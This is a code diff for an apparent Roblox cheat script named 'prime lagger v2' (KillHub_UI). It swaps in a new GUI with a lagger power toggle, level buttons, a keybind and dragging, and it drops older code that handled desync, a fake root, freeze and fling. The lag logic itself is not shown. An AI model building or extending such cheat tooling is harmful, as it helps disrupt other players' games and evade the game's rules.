+    lockButton.TextSize = 6 * avgScale
+    shrinkButton.Size = UDim2.new(0, 14 * scaleX, 0, 14 * scaleY)
+    shrinkButton.Position = UDim2.new(1, -30 * scaleX, 0, 2 * scaleY)
+    shrinkButton.TextSize = 12 * avgScale
+    growButton.Size = UDim2.new(0, 14 * scaleX, 0, 14 * scaleY)
+    growButton.Position = UDim2.new(1, -16 * scaleX, 0, 2 * scaleY)
+    growButton.TextSize = 12 * avgScale
+    textPower.Size = UDim2.new(0, 45 * scaleX, 0, 18 * scaleY)
+    textPower.Position = UDim2.new(0, 5 * scaleX, 0, 24 * scaleY)
+    textPower.TextSize = 11 * avgScale
+    bgToggleButton.Size = UDim2.new(0, 17 * scaleX, 0, 18 * scaleY)
+    bgToggleButton.Position = UDim2.new(0, 55 * scaleX, 0, 24 * scaleY)
+    bgToggleButton.TextSize = 7 * avgScale
+    toggleContainer.Size = UDim2.new(0, 34 * scaleX, 0, 18 * scaleY)
+    toggleContainer.Position = UDim2.new(0, 160 * scaleX, 0, 24 * scaleY)
+    toggleBall.Size = UDim2.new(0, 12 * scaleX, 0, 12 * scaleY)
+    if laggerActive then
+        toggleBall.Position = UDim2.new(1, -14 * scaleX, 0.5, -7 * scaleY)
+    else
+        toggleBall.Position = UDim2.new(0, 3 * scaleX, 0.5, -7 * scaleY)
+    end
+    toggleClick.TextSize = 6 * avgScale
+    local btnW = 42 * scaleX
+    local btnH = 20 * scaleY
+    local espaciado = 3 * scaleX
+    local margenIzq = 5 * scaleX
+    local btnY = 46 * scaleY
+    btnV1.Size = UDim2.new(0, btnW, 0, btnH)
+    btnV1.Position = UDim2.new(0, margenIzq, 0, btnY)
+    btnV1.TextSize = 8 * avgScale
+    btnV2.Size = UDim2.new(0, btnW, 0, btnH)
+    btnV2.Position = UDim2.new(0, margenIzq + btnW + espaciado, 0, btnY)
+    btnV2.TextSize = 8 * avgScale
+    btnV3.Size = UDim2.new(0, btnW, 0, btnH)
+    btnV3.Position = UDim2.new(0, margenIzq + (btnW + espaciado) * 2, 0, btnY)
+    btnV3.TextSize = 8 * avgScale
+    btnV4.Size = UDim2.new(0, btnW, 0, btnH)
+    btnV4.Position = UDim2.new(0, margenIzq + (btnW + espaciado) * 3, 0, btnY)
+    btnV4.TextSize = 7 * avgScale
 end
-
-local function toggleEnabled()
-return setEnabled(not runtime.enabled)
+local function resizeGUI(deltaW, deltaH)
+    if ventanaBloqueada then
+        return
+    end
+    local currentW = mainFrame.Size.X.Offset
+    local currentH = mainFrame.Size.Y.Offset
+    local newW = math.clamp(currentW + deltaW, MIN_WIDTH, MAX_WIDTH)
+    local newH = math.clamp(currentH + deltaH, MIN_HEIGHT, MAX_HEIGHT)
+    if newW == currentW and newH == currentH then
+        return
+    end
+    mainFrame.Size = UDim2.new(0, newW, 0, newH)
+    updateLayout()
 end
-
-connect(toggleHit.MouseButton1Click, function()
-ripple(toggleRow)
-toggleEnabled()
-end)
-
--- Key capture and bound-key toggle ------------------------------------------
-
-connect(keybindButton.MouseButton1Click, function()
-if not runtime.alive or runtime.awaitingKey then
-return
+if CoreGui:FindFirstChild("KillHub_UI") then
+    CoreGui.KillHub_UI:Destroy()
 end
-
-ripple(keybindRow)
-runtime.awaitingKey = true
-runtime.captureGeneration += 1
-local generation = runtime.captureGeneration
-
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "KillHub_UI"
+screenGui.Parent = CoreGui
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.ResetOnSpawn = false
+mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+mainFrame.BackgroundTransparency = 0
+mainFrame.BorderSizePixel = 2
+mainFrame.BorderColor3 = Color3.fromRGB(219, 39, 119)
+mainFrame.Size = UDim2.new(0, 200, 0, 78)
+mainFrame.Position = UDim2.new(0.15, 0, 0.5, -39)
+mainFrame.Parent = screenGui
+mainFrame.ClipsDescendants = true
+Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 8)
+bgImage = Instance.new("ImageLabel", mainFrame)
+bgImage.Name = "BgImage"
+bgImage.Size = UDim2.new(1, 0, 1, 0)
+bgImage.Position = UDim2.new(0, 0, 0, 0)
+bgImage.BackgroundTransparency = 1
+bgImage.Image = BG1_ID
+bgImage.ImageTransparency = 0
+bgImage.ScaleType = Enum.ScaleType.Crop
+bgImage.ZIndex = 0
+Instance.new("UICorner", bgImage).CornerRadius = UDim.new(0, 8)
+contentFrame = Instance.new("Frame", mainFrame)
+contentFrame.BackgroundTransparency = 1
+contentFrame.Size = UDim2.new(1, 0, 1, 0)
+contentFrame.Position = UDim2.new(0, 0, 0, 0)
+contentFrame.ZIndex = 1
+Instance.new("UICorner", contentFrame).CornerRadius = UDim.new(0, 8)
+local stars = {}
+for i = 1, 35 do
+    local star = Instance.new("Frame", contentFrame)
+    star.BackgroundColor3 = Color3.fromRGB(219, 39, 119)
+    star.BorderSizePixel = 0
+    star.Size = UDim2.new(0, 1 + math.random() * 2, 0, 1 + math.random() * 2)
+    star.Position = UDim2.new(math.random(), 0, math.random(), 0)
+    star.ZIndex = 1
+    star.BackgroundTransparency = 0.2 + math.random() * 0.5
+    local corner = Instance.new("UICorner", star)
+    corner.CornerRadius = UDim.new(1, 0)
+    table.insert(stars, {
+        frame = star,
+        transparency = star.BackgroundTransparency,
+        timer = 2 + math.random() * 2,
+        elapsed = 0
+    })
+end
 task.spawn(function()
-for _, text in ipairs({".", "..", "..."}) do
-if not runtime.alive
-or not runtime.awaitingKey
-or generation ~= runtime.captureGeneration
-then
-return
-end
-keybindButton.Text = text
-task.wait(0.15)
-end
+    while true do
+        for _, starData in ipairs(stars) do
+            starData.elapsed = starData.elapsed + 0.1
+            if starData.elapsed >= starData.timer then
+                starData.elapsed = 0
+                starData.timer = 2 + math.random() * 2
+                local star = starData.frame
+                TweenService:Create(star, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
+                    BackgroundTransparency = 1
+                }):Play()
+                task.wait(0.2)
+                star.Position = UDim2.new(math.random(), 0, math.random(), 0)
+                local newSize = 1 + math.random() * 2
+                star.Size = UDim2.new(0, newSize, 0, newSize)
+                TweenService:Create(star, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
+                    BackgroundTransparency = starData.transparency
+                }):Play()
+            end
+        end
+        task.wait(0.1)
+    end
 end)
+titleLabel = Instance.new("TextLabel", contentFrame)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Position = UDim2.new(0, 8, 0, 0)
+titleLabel.Size = UDim2.new(0, 110, 0, 22)
+titleLabel.Font = Enum.Font.GothamBlack
+titleLabel.Text = "prime lagger v2"
+titleLabel.TextColor3 = Color3.fromRGB(190, 24, 93)
+titleLabel.TextSize = 14
+titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+titleLabel.TextYAlignment = Enum.TextYAlignment.Center
+titleLabel.ZIndex = 3
+titleLabel.ClipsDescendants = false
+task.spawn(function()
+    local duration = 1.5
+    while true do
+        local color1 = RED
+        local color2 = Color3.fromRGB(249, 168, 212)
+        local tween1 = TweenService:Create(titleLabel, TweenInfo.new(duration, Enum.EasingStyle.Linear), {
+            TextColor3 = color1
+        })
+        tween1:Play()
+        tween1.Completed:Wait()
+        local tween2 = TweenService:Create(titleLabel, TweenInfo.new(duration, Enum.EasingStyle.Linear), {
+            TextColor3 = color2
+        })
+        tween2:Play()
+        tween2.Completed:Wait()
+    end
 end)
-
-local function isValidBindInput(input)
-if input.KeyCode == Enum.KeyCode.Unknown then
-return false
-end
-local t = input.UserInputType
-return t == Enum.UserInputType.Keyboard
-or t == Enum.UserInputType.Gamepad1
-or t == Enum.UserInputType.Gamepad2
-or t == Enum.UserInputType.Gamepad3
-or t == Enum.UserInputType.Gamepad4
-or t == Enum.UserInputType.Gamepad5
-or t == Enum.UserInputType.Gamepad6
-or t == Enum.UserInputType.Gamepad7
-or t == Enum.UserInputType.Gamepad8
-end
-
-connect(UserInputService.InputBegan, function(input, gameProcessed)
-if not runtime.alive then
-return
-end
-
-if runtime.awaitingKey then
-if isValidBindInput(input) then
--- Escape cancels without changing the bind
-if input.KeyCode ~= Enum.KeyCode.Escape then
-runtime.boundKey = input.KeyCode
-end
-runtime.awaitingKey = false
-runtime.captureGeneration += 1
-keybindButton.Text = runtime.boundKey.Name
-end
-return
-end
-
-if not gameProcessed and input.KeyCode == runtime.boundKey then
-ripple(toggleRow)
-toggleEnabled()
-end
+keybindButton = Instance.new("TextButton", mainFrame)
+keybindButton.BackgroundColor3 = Color3.fromRGB(253, 242, 248)
+keybindButton.BackgroundTransparency = 0.1
+keybindButton.Position = UDim2.new(0, 96, 0, 1)
+keybindButton.Size = UDim2.new(0, 34, 0, 14)
+keybindButton.Font = Enum.Font.GothamBlack
+keybindButton.Text = "KEY: M"
+keybindButton.TextColor3 = Color3.fromRGB(219, 39, 119)
+keybindButton.TextSize = 6
+keybindButton.AutoButtonColor = false
+keybindButton.ZIndex = 2
+Instance.new("UICorner", keybindButton).CornerRadius = UDim.new(1, 0)
+actualizarKeybindButton()
+lockButton = Instance.new("TextButton", mainFrame)
+lockButton.BackgroundTransparency = 0
+lockButton.BackgroundColor3 = Color3.fromRGB(253, 242, 248)
+lockButton.BackgroundTransparency = 0.1
+lockButton.Position = UDim2.new(0, 145, 0, 1)
+lockButton.Size = UDim2.new(0, 22, 0, 14)
+lockButton.Font = Enum.Font.GothamBlack
+lockButton.TextSize = 6
+lockButton.TextColor3 = Color3.fromRGB(219, 39, 119)
+lockButton.AutoButtonColor = false
+lockButton.ZIndex = 2
+Instance.new("UICorner", lockButton).CornerRadius = UDim.new(1, 0)
+lockButton.MouseButton1Click:Connect(function()
+    ventanaBloqueada = not ventanaBloqueada
+    actualizarCandado()
+    SaveConfig()
 end)
-
--- Minimize & Lock ------------------------------------------------------------
-
-connect(minimizeBtn.MouseButton1Click, function()
-if not runtime.alive then return end
-runtime.isMinimized = not runtime.isMinimized
-minimizeBtn.Text = runtime.isMinimized and "+" or "-"
-TweenService:Create(main, TweenInfo.new(0.22, Enum.EasingStyle.Quad), {
-Size = UDim2.new(0, 310, 0, runtime.isMinimized and MINI_HEIGHT or FULL_HEIGHT)
-}):Play()
+actualizarCandado()
+shrinkButton = Instance.new("TextButton", mainFrame)
+shrinkButton.BackgroundColor3 = Color3.fromRGB(253, 242, 248)
+shrinkButton.BackgroundTransparency = 0.1
+shrinkButton.Position = UDim2.new(1, -30, 0, 2)
+shrinkButton.Size = UDim2.new(0, 14, 0, 14)
+shrinkButton.Font = Enum.Font.GothamBlack
+shrinkButton.Text = "-"
+shrinkButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+shrinkButton.TextSize = 12
+shrinkButton.AutoButtonColor = false
+shrinkButton.ZIndex = 2
+Instance.new("UICorner", shrinkButton).CornerRadius = UDim.new(1, 0)
+shrinkButton.MouseButton1Click:Connect(function()
+    resizeGUI(-STEP_W, -STEP_H)
 end)
-
-connect(lockBtn.MouseButton1Click, function()
-if not runtime.alive then return end
-runtime.isLocked = not runtime.isLocked
-lockBtn.Text = runtime.isLocked and "Unlock" or "Lock"
+growButton = Instance.new("TextButton", mainFrame)
+growButton.BackgroundColor3 = Color3.fromRGB(253, 242, 248)
+growButton.BackgroundTransparency = 0.1
+growButton.Position = UDim2.new(1, -16, 0, 2)
+growButton.Size = UDim2.new(0, 14, 0, 14)
+growButton.Font = Enum.Font.GothamBlack
+growButton.Text = "+"
+growButton.TextColor3 = Color3.fromRGB(236, 72, 153)
+growButton.TextSize = 12
+growButton.AutoButtonColor = false
+growButton.ZIndex = 2
+Instance.new("UICorner", growButton).CornerRadius = UDim.new(1, 0)
+growButton.MouseButton1Click:Connect(function()
+    resizeGUI(STEP_W, STEP_H)
 end)
-
--- Draggable panel ------------------------------------------------------------
-
-local dragging = false
-local dragInput = nil
-local dragStart = nil
-local startPosition = nil
-
-connect(main.InputBegan, function(input)
-if runtime.isLocked then return end
-if input.UserInputType == Enum.UserInputType.MouseButton1
-or input.UserInputType == Enum.UserInputType.Touch
-then
-dragging = true
-dragInput = input
-dragStart = input.Position
-startPosition = main.Position
-
-local changedConnection
-changedConnection = input.Changed:Connect(function()
-if input.UserInputState == Enum.UserInputState.End then
-dragging = false
-dragInput = nil
-disconnect(changedConnection)
-end
+textPower = Instance.new("TextLabel", contentFrame)
+textPower.BackgroundTransparency = 1
+textPower.Position = UDim2.new(0, 5, 0, 24)
+textPower.Size = UDim2.new(0, 45, 0, 18)
+textPower.Font = Enum.Font.GothamBlack
+textPower.Text = "POWER"
+textPower.TextColor3 = Color3.fromRGB(236, 72, 153)
+textPower.TextSize = 11
+textPower.TextXAlignment = Enum.TextXAlignment.Left
+textPower.TextYAlignment = Enum.TextYAlignment.Center
+textPower.ZIndex = 2
+toggleContainer = Instance.new("Frame", contentFrame)
+toggleContainer.BackgroundColor3 = UI_CONFIG.ToggleOff
+toggleContainer.Position = UDim2.new(0, 160, 0, 24)
+toggleContainer.Size = UDim2.new(0, 34, 0, 18)
+toggleContainer.ZIndex = 2
+Instance.new("UICorner", toggleContainer).CornerRadius = UDim.new(1, 0)
+toggleBall = Instance.new("Frame", toggleContainer)
+toggleBall.BackgroundColor3 = UI_CONFIG.ToggleOff
+toggleBall.Size = UDim2.new(0, 12, 0, 12)
+toggleBall.Position = UDim2.new(0, 3, 0.5, -7)
+toggleBall.ZIndex = 2
+Instance.new("UICorner", toggleBall).CornerRadius = UDim.new(1, 0)
+toggleClick = Instance.new("TextButton", toggleContainer)
+toggleClick.BackgroundTransparency = 0
+toggleClick.BackgroundColor3 = Color3.fromRGB(253, 242, 248)
+toggleClick.Size = UDim2.new(1, 0, 1, 0)
+toggleClick.ZIndex = 3
+toggleClick.Font = Enum.Font.GothamBlack
+toggleClick.Text = "INACTIVE"
+toggleClick.TextSize = 6
+toggleClick.TextColor3 = Color3.fromRGB(236, 72, 153)
+toggleClick.TextXAlignment = Enum.TextXAlignment.Center
+toggleClick.TextYAlignment = Enum.TextYAlignment.Center
+toggleClick.MouseButton1Click:Connect(toggleLagger)
+toggleClick.AutoButtonColor = false
+Instance.new("UICorner", toggleClick).CornerRadius = UDim.new(1, 0)
+bgToggleButton = Instance.new("TextButton", contentFrame)
+bgToggleButton.BackgroundColor3 = RED
+bgToggleButton.BackgroundTransparency = 0.1
+bgToggleButton.Position = UDim2.new(0, 55, 0, 24)
+bgToggleButton.Size = UDim2.new(0, 17, 0, 18)
+bgToggleButton.Font = Enum.Font.GothamBlack
+bgToggleButton.Text = "BG1"
+bgToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+bgToggleButton.TextSize = 7
+bgToggleButton.AutoButtonColor = false
+bgToggleButton.ZIndex = 2
+Instance.new("UICorner", bgToggleButton).CornerRadius = UDim.new(1, 0)
+bgToggleButton.MouseButton1Click:Connect(function()
+    if currentBg == 1 then
+        currentBg = 2
+    else
+        currentBg = 1
+    end
+    actualizarBg()
+    SaveConfig()
 end)
-end
+keybindButton.MouseButton1Click:Connect(function()
+    if listeningForInput then
+        return
+    end
+    listeningForInput = true
+    keybindButton.Text = "KEY: ..."
+    keybindButton.BackgroundColor3 = Color3.fromRGB(219, 39, 119)
+    keybindButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 end)
-
-connect(main.InputChanged, function(input)
-if input.UserInputType == Enum.UserInputType.MouseMovement
-or input.UserInputType == Enum.UserInputType.Touch
-then
-dragInput = input
-end
+local inputConnection
+inputConnection = UserInputService.InputBegan:Connect(function(input, gp)
+    if not listeningForInput then
+        return
+    end
+    if gp then
+        return
+    end
+    local newKey = nil
+    if input.KeyCode ~= Enum.KeyCode.Unknown then
+        newKey = input.KeyCode
+    elseif input.UserInputType == Enum.UserInputType.Gamepad1 and input.KeyCode ~= Enum.KeyCode.Unknown then
+        newKey = input.KeyCode
+    end
+    if newKey then
+        keybind = newKey
+        actualizarKeybindButton()
+        listeningForInput = false
+        keybindButton.BackgroundColor3 = Color3.fromRGB(253, 242, 248)
+        keybindButton.BackgroundTransparency = 0.1
+        keybindButton.TextColor3 = Color3.fromRGB(219, 39, 119)
+        SaveConfig()
+    end
 end)
-
-connect(UserInputService.InputChanged, function(input)
-if runtime.isLocked or not dragging or input ~= dragInput or not dragStart or not startPosition then
-return
-end
-
-local delta = input.Position - dragStart
-main.Position = UDim2.new(
-startPosition.X.Scale,
-startPosition.X.Offset + delta.X,
-startPosition.Y.Scale,
-startPosition.Y.Offset + delta.Y
-)
+local btnY = 46
+local btnW = 42
+local btnH = 20
+local espaciado = 3
+local margenIzq = 5
+btnV1 = Instance.new("TextButton", contentFrame)
+btnV1.Size = UDim2.new(0, btnW, 0, btnH)
+btnV1.Position = UDim2.new(0, margenIzq, 0, btnY)
+btnV1.Font = UI_CONFIG.Font
+btnV1.Text = "V1"
+btnV1.TextColor3 = Color3.fromRGB(219, 39, 119)
+btnV1.TextSize = 8
+btnV1.AutoButtonColor = false
+btnV1.BackgroundColor3 = UI_CONFIG.ButtonInact
+btnV1.BorderSizePixel = 1
+btnV1.BorderColor3 = UI_CONFIG.BorderColor
+btnV1.ZIndex = 2
+Instance.new("UICorner", btnV1).CornerRadius = UDim.new(1, 0)
+btnV1.MouseButton1Click:Connect(function()
+    nivelActual = "V1"
+    aplicarEsquema()
+    SaveConfig()
 end)
-
--- Cleanup --------------------------------------------------------------------
-
-local function destroy()
-if not runtime.alive then
-return
-end
-
-runtime.alive = false
-runtime.enabled = false
-runtime.awaitingKey = false
-runtime.captureGeneration += 1
-
-stopStepConnection()
-restoreReplicationRoot()
-destroyFakeRoot()
-
-stopAntiBat()
-stopFreeze()
-stopFling()
-
-for _, connection in ipairs(runtime.connections) do
-disconnect(connection)
-end
-table.clear(runtime.connections)
-
-for index = #runtime.settingsRestore, 1, -1 do
-local entry = runtime.settingsRestore[index]
-pcall(function()
-entry.instance[entry.property] = entry.value
+btnV2 = Instance.new("TextButton", contentFrame)
+btnV2.Size = UDim2.new(0, btnW, 0, btnH)
+btnV2.Position = UDim2.new(0, margenIzq + btnW + espaciado, 0, btnY)
+btnV2.Font = UI_CONFIG.Font
+btnV2.Text = "V2"
+btnV2.TextColor3 = Color3.fromRGB(219, 39, 119)
+btnV2.TextSize = 8
+btnV2.AutoButtonColor = false
+btnV2.BackgroundColor3 = UI_CONFIG.ButtonInact
+btnV2.BorderSizePixel = 1
+btnV2.BorderColor3 = UI_CONFIG.BorderColor
+btnV2.ZIndex = 2
+Instance.new("UICorner", btnV2).CornerRadius = UDim.new(1, 0)
+btnV2.MouseButton1Click:Connect(function()
+    nivelActual = "V2"
+    aplicarEsquema()
+    SaveConfig()
 end)
-end
-table.clear(runtime.settingsRestore)
-
-if runtime.gui then
-pcall(function()
-runtime.gui:Destroy()
+btnV3 = Instance.new("TextButton", contentFrame)
+btnV3.Size = UDim2.new(0, btnW, 0, btnH)
+btnV3.Position = UDim2.new(0, margenIzq + (btnW + espaciado) * 2, 0, btnY)
+btnV3.Font = UI_CONFIG.Font
+btnV3.Text = "V3"
+btnV3.TextColor3 = Color3.fromRGB(219, 39, 119)
+btnV3.TextSize = 8
+btnV3.AutoButtonColor = false
+btnV3.BackgroundColor3 = UI_CONFIG.ButtonInact
+btnV3.BorderSizePixel = 1
+btnV3.BorderColor3 = UI_CONFIG.BorderColor
+btnV3.ZIndex = 2
+Instance.new("UICorner", btnV3).CornerRadius = UDim.new(1, 0)
+btnV3.MouseButton1Click:Connect(function()
+    nivelActual = "V3"
+    aplicarEsquema()
+    SaveConfig()
 end)
-end
-
-if environment[RUNTIME_KEY] == runtime then
-environment[RUNTIME_KEY] = nil
-end
-end
-
-runtime.setEnabled = setEnabled
-runtime.toggle = toggleEnabled
-runtime.step = stepDesync
-runtime.bindCharacter = bindCharacter
-runtime.setHidden = setHidden
-runtime.getHidden = getHidden
-runtime.destroy = destroy
-runtime.getBoundKey = function()
-return runtime.boundKey
-end
-runtime.setBoundKey = function(keyCode)
-if keyCode and keyCode ~= Enum.KeyCode.Unknown then
-runtime.boundKey = keyCode
-keybindButton.Text = keyCode.Name
-return true
-end
-return false
-end
-
-applyEnabledVisual(false, true)
+btnV4 = Instance.new("TextButton", contentFrame)
+btnV4.Size = UDim2.new(0, btnW, 0, btnH)
+btnV4.Position = UDim2.new(0, margenIzq + (btnW + espaciado) * 3, 0, btnY)
+btnV4.Font = UI_CONFIG.Font
+btnV4.Text = "V4"
+btnV4.TextColor3 = Color3.fromRGB(219, 39, 119)
+btnV4.TextSize = 7
+btnV4.AutoButtonColor = false
+btnV4.BackgroundColor3 = UI_CONFIG.ButtonInact
+btnV4.BorderSizePixel = 1
+btnV4.BorderColor3 = UI_CONFIG.BorderColor
+btnV4.ZIndex = 2
+Instance.new("UICorner", btnV4).CornerRadius = UDim.new(1, 0)
+btnV4.MouseButton1Click:Connect(function()
+    nivelActual = "V4"
+    aplicarEsquema()
+    SaveConfig()
+end)
+actualizarBg()
+actualizarSwitch()
+updateLayout()
+aplicarEsquema()
+local isDragging, dragStart, startPos = false, nil, nil
+mainFrame.InputBegan:Connect(function(input)
+    if ventanaBloqueada then
+        return
+    end
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        isDragging = true
+        dragStart = input.Position
+        startPos = mainFrame.Position
+    end
+end)
+UserInputService.InputChanged:Connect(function(input)
+    if not isDragging or ventanaBloqueada then
+        return
+    end
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        local delta = input.Position - dragStart
+        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+mainFrame.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        isDragging = false
+    end
+end)
+UserInputService.InputBegan:Connect(function(input, gp)
+    if gp then
+        return
+    end
+    if input.KeyCode == keybind or (input.UserInputType == Enum.UserInputType.Gamepad1 and input.KeyCode == keybind) then
+        toggleLagger()
+    end
+end)
